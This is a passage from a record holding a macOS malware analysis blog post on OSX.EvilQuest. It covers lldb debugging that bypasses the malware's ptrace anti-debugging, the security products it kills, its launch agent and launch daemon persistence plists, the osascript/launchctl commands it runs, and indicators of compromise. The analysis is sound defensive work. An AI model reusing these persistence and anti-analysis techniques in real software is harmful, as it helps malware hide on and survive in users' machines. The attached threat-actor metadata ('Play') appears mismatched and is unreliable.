near  \n 2__text:0000000100007C20         push  rbp\n 3__text:0000000100007C21         mov   rbp, rsp\n 4__text:0000000100007C24         call  _getpid\n 5__text:0000000100007C29         xor   ecx, ecx\n 6__text:0000000100007C2B         mov   edx, ecx    ; addr\n 7__text:0000000100007C2D         xor   ecx, ecx    ; data\n 8__text:0000000100007C2F         mov   edi, 1Fh    ; request\n 9__text:0000000100007C34         mov   esi, eax    ; pid\n10__text:0000000100007C36         call  _ptrace\n11__text:0000000100007C3B         pop   rbp\n12__text:0000000100007C3C         retn\n13__text:0000000100007C3C _prevent_trace endp\n\n To bypass this, we simply avoid the call to _prevent_trace all together. However? Simply set a breakpoint on the call to this function, then modify the value of the instruction pointer ( RIP ) to skip it!\n(lldb) b 0x000000010000B8B2\nBreakpoint 12: where = patch`patch[0x000000010000b8b2], address = 0x000000010000b8b2\n(lldb) c\nProcess 683 resuming\nProcess 683 stopped\n* thread #1, queue = 'com.apple.main-thread', stop reason = breakpoint 2.1\n-> 0x10000b8b2: callq 0x100007c20\n  0x10000b8b7: leaq  0x7de2(%rip), %rdi\n  0x10000b8be: movl  $0x8, %esi\n  0x10000b8c3: movl  %eax, -0x38(%rbp)\nTarget 0: (patch) stopped.\n(lldb) reg write $rip 0x10000b8b7\n(lldb) c\n\n Easy peasy! Now we can continue our dynamic analysis unperturbed.\n\n```\n\n-----\n\n### As its name suggests, the ei_persistence_main function persists the malware (as a launch agent). However, before persisting it invokes a function named kill_unwanted to kill several well known security products that may detect or block malicious behaviors.\n\n The kill_unwanted function gets a list of running processes, compares each process with a encrypted list of ‚Äúunwanted‚Äù programs. With our aforementioned breakpoint on the\n```\nei_str function, we can dump the decrypted strings, to ascertain the value of the\n\n ‚Äúunwanted‚Äù programs:\n(lldb) x/s $rax\n0x100108fd0: \"Little Snitch\"\n(lldb) x/s $rax\n0x100100880: \"Kaspersky\"\n(lldb) x/s $rax\n0x1001028a0: \"Norton\"\n(lldb) x/s $rax\n0x10010a2f0: \"Avast\"\n(lldb) x/s $rax\n0x10010a300: \"DrWeb\"\n(lldb) x/s $rax\n0x100102eb0: \"Mcaffee\"\n(lldb) x/s $rax\n0x100109d20: \"Bitdefender\"\n(lldb) x/s $rax\n0x100109d30: \"Bullguard\"\n\n ‚Ä¶one day, Objective-See‚Äôs tools will make such a list! HA!\n\n Finally the ei_persistence_main function persists the malware. Specifically it first calls the persist_executable function creates a persistent copy of itself. We can observe this via a file monitor, and/or in the debugger.\n\n First, we observe the malware decrypting various strings related to persistence:\n(lldb) x/s $rax\n0x100118fd0: \"/Library/AppQuest/com.apple.questd\"\n(lldb) x/s $rax\n0x1001190f0: \"%s/Library/AppQuest/com.apple.questd\"\n\n```\n\n-----\n\n### If the malware is running with non-root privileges it will write the copy of itself to\n```\n~/Library/AppQuest/com.apple.questd . However, if running as root, it will also copy\n\n itself to /Library/AppQuest/com.apple.questd . This can be observed via a file monitor (such as macOS‚Äôs fs_usage utility). Here, we see a non-root instance of the malware creating ~/Library/AppQuest/com.apple.questd and ensuring it is executable (via\nchmod ):\n# fs_usage -w -f filesystem\nopen  F=4  /Library/AppQuest/com.apple.questd toolroomd.67949\nwrite  F=4  B=0x1000 toolroomd.67949\n...\nclose  F=4 toolroomd.67949\nchmod   /Library/AppQuest/com.apple.questd toolroomd.67949\nopen  F=4 ~/Library/AppQuest/com.apple.questd\nwrite  F=4  B=0x1000 toolroomd.67949\n...\nclose  F=4 toolroomd.67949\nchmod  ~/Library/AppQuest/com.apple.questd toolroomd.67949 \n$ md5 /Library/AppQuest/com.apple.questd\nMD5 (/Library/AppQuest/com.apple.questd) = 322f4fb8f257a2e651b128c41df92b1d\n$ md5 ~/Library/AppQuest/com.apple.questd\nMD5 (/Users/user/Library/AppQuest/com.apple.questd) =\n322f4fb8f257a2e651b128c41df92b1d\n\n Once the malware has copied itself, it persists via a launch item. The code that performs this persistence is found in the install_daemon function (address 0x0000000100009130 ), that is invoked via the ei_persistence_main function.\n\n If running as non-root, it persists as a launch agent:\n~/Library/LaunchAgents/com.apple.questd.plist . Below we dump that arguments\n\n passed to the install_daemon ‚Ä¶first, when the malware is installing itself as a launch agent: `\n\n```\n\n-----\n\n```\n$ lldb /Library/mixednkey/toolroomd\n...\n* thread #1, stop reason = breakpoint 1.1\nframe #0: 0x0000000100009130 toolroomd\n-> 0x100009130: pushq %rbp\n  0x100009131: movq  %rsp, %rbp\n  0x100009134: subq  $0x150, %rsp     \n  0x10000913b: movq  %rdi, -0x10(%rbp)\nTarget 0: (toolroomd) stopped.\n(lldb) x/s $rdi\n0x7ffeefbffc94: \"/Users/user\"\n(lldb) x/s $rsi\n0x100114a20: \"%s/Library/AppQuest/com.apple.questd\"\n(lldb) x/s $rdx\n0x100114740: \"%s/Library/LaunchAgents/\"\n\n### It uses the arguments to build a path for a launch item (here, launch agent) property list ( /Users/user/Library/LaunchAgents/com.apple.questd.plist ), as well then configuring said plist.\n\n Continuing the debugging session, we observes the malware decrypted an embedded (template) plist, that is then populated with the path to the persistent binary (e.g.\n/Users/user/Library/AppQuest/com.apple.questd ).\nx/s $rax\n0x100119540: \"<?xml version=\"1.0\" encoding=\"UTF-8\"?>\\n<!DOCTYPE plist PUBLIC\n\"-//Apple//DTD PLIST 1.0//EN\" \"http://www.apple.com/DTDs/PropertyList1.0.dtd\">\\n<plist\nversion=\"1.0\">\\n<dict>\\n<key>Label</key>\\n<string>%s</string>\\n\\n<key>ProgramArguments\nsilent</string>\\n</array>\\n\\n<key>RunAtLoad</key>\\n<true/>\\n\\n<key>KeepAlive</key>\\n<t\n\n Once the launch agent property list is fully configured in memory the malware writes it out to disk:\n\n```\n\n-----\n\n```\ncat /Users/user/Library/LaunchAgents/com.apple.questd.plist \n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!DOCTYPE plist PUBLIC \"-//Apple//DTD PLIST 1.0//EN\"\n\"http://www.apple.com/DTDs/PropertyList-1.0.dtd\">\n<plist version=\"1.0\">\n<dict>\n  <key>Label</key>\n  <string>questd</string>\n  <key>ProgramArguments</key>\n  <array>\n    <string>/Users/user/Library/AppQuest/com.apple.questd</string>\n    <string>--silent</string>\n  </array>\n  <key>RunAtLoad</key>\n  <true/>\n  <key>KeepAlive</key>\n  <true/>\n</dict>\n\n### As the RunAtLoad key is set to true the malware ( com.apple.questd ) will be automatically restarted each time the user logs in.\n\n Of course BlockBlock detects this persistence attempt üòá\n\n If the malware is running with root privileges it will invoke the install_daemon function again, but this time passing in arguments specifying that a launch daemon should be created:\n\n```\n\n-----\n\n```\n$ cat /Library/LaunchDaemons/com.apple.questd.plist \n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!DOCTYPE plist PUBLIC \"-//Apple//DTD PLIST 1.0//EN\"\n\"http://www.apple.com/DTDs/PropertyList-1.0.dtd\">\n<plist version=\"1.0\">\n<dict>\n  <key>Label</key>\n  <string>questd</string>\n  <key>ProgramArguments</key>\n  <array>\n    <string>sudo</string>\n    <string>/Library/AppQuest/com.apple.questd</string>\n    <string>--silent</string>\n  </array>\n  <key>RunAtLoad</key>\n  <true/>\n  <key>KeepAlive</key>\n  <true/>\n</dict>\n\n### Once the malware has ensured it is persisted (twice, if running as root!), it invokes the\nei_selfretain_main to starts the launch item(s). This function invokes the aptly named\nrun_daemon which in turn invokes macOS osascript binary to launch the items. We can\n\n observe this via a process monitor, for example, when the malware starts the launch daemon:\n# procInfo\n[process start]\npid: 1142\npath: /usr/bin/osascript\nuser: 0\nargs: (\n  osascript,\n  \"-e\",\n  \"do shell script \\\"launchctl load -w\n/Library/LaunchDaemons/com.apple.questd.plist;launchctl start questd\\\" with\nadministrator privileges\"\n)\n\n Once the malware was persisted and kicked off the launch items, it invokes a function named create_rescue_executable to create yet another copy of itself. This copy will made in the user‚Äôs Library directory. Its named starts with a . so that it won‚Äôt show up in the UI (i.e. Finder.app ), and is then followed via 9 random characters. For example:\n\n```\n\n-----\n\n### The malware also appends a some trailer data to this copy:\n\n The contents of this file are also saves in global variable named priv_rescue_data, which allows the malware to ‚Äòrescue‚Äô itself if it deleted from disk (yet still running in memory). Looking at the cross-references to this variable reveal its (later) references in function such as resque_myself and persist_executable\n\n ‚Ä¶clearly this malware doesn‚Äôt want to be removed from an infected system!\n\n Via a process monitor, we can observe the malware then kicking off this ‚Äúconfigured‚Äù copy via the launchctl submit -l ... command:\n\n\n-----\n\n```\n[procInfo] process start:\npid: 737\npath: /bin/launchctl\nuser: 501\nargs: (\n  launchctl,\n  submit,\n  \"-l\",\n  questd,\n  \"-p\",\n  \"/Users/user/Library/.9W4S5dtNK\"\n)\n[procInfo] process start:\npid: 738\npath: /Users/user/Library/.9W4S5dtNK\nuser: 0\n...\n\n### So, now the malware has persisted and launched a configured (i.e. with ‚Äútrailer‚Äù data) instance of itself. What does it appear to do? Actually a lot! ‚Ä¶ pop over to part two, to read all about it!\n\n## Conclusion\n\n### Today, we triaged an interesting piece of new malware - detailing its infection vector, persistence, and anti-analysis logic.\n\n Though new, our (free!) tools such as BlockBlock and RansomWhere? were able to detect and thwart various aspects of the attack ‚Ä¶with no a priori knowledge!\n\n```\n\n-----\n\n### IoCs:\n```\n   /Library/mixednkey/toolroomd\n   /Library/AppQuest/com.apple.questd\n   ~/Library/AppQuest/com.apple.questd\n   /Library/LaunchDaemons/com.apple.questd.plist\n   ~/Library/LaunchAgents/com.apple.questd.plist\n\n Note though if you are infected, due to the malware‚Äôs viral infection capabilities, it is recommended that one wipes the infected system and fully reinstalls macOS.\n\n ‚ù§ Love these blog posts and/or want to support my research and tools? You can support them via my Patreon page!\n\n```\n\n-----\n\n### [\n\n ](https://www.patreon.com/bePatron?c=701171) This website uses cookies to improve your experience.\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2020/2020-06-29 - OSX.EvilQuest Uncovered.pdf"
    ],
    "report_names": [
        "2020-06-29 - OSX.EvilQuest Uncovered.pdf"
    ],
    "threat_actors": [
        {
            "id": "75108fc1-7f6a-450e-b024-10284f3f62bb",
            "created_at": "2024-11-01T02:00:52.756877Z",
            "updated_at": "2025-03-27T02:00:55.544216Z",
            "deleted_at": null,
            "main_name": "Play",
            "aliases": null,
            "source_name": "MITRE:Play",
            "tools": [
                "Nltest",
                "AdFind",
                "PsExec",
                "Wevtutil",
                "Cobalt Strike",
                "Playcrypt",
                "Mimikatz"
            ],
            "source_id": "MITRE",
            "reports": null
        }
    ],
    "ts_created_at": 1673535677,
    "ts_updated_at": 1743041785,
    "ts_creation_date": 1653787403,
    "ts_modification_date": 1653787403,
    "files": {
        "pdf": "https://archive.orkl.eu/3e57afb6d690dbc1de6e3931f054cc513e428f5c.pdf",
        "text": "https://archive.orkl.eu/3e57afb6d690dbc1de6e3931f054cc513e428f5c.txt",
        "img": "https://archive.orkl.eu/3e57afb6d690dbc1de6e3931f054cc513e428f5c.jpg"
    }
}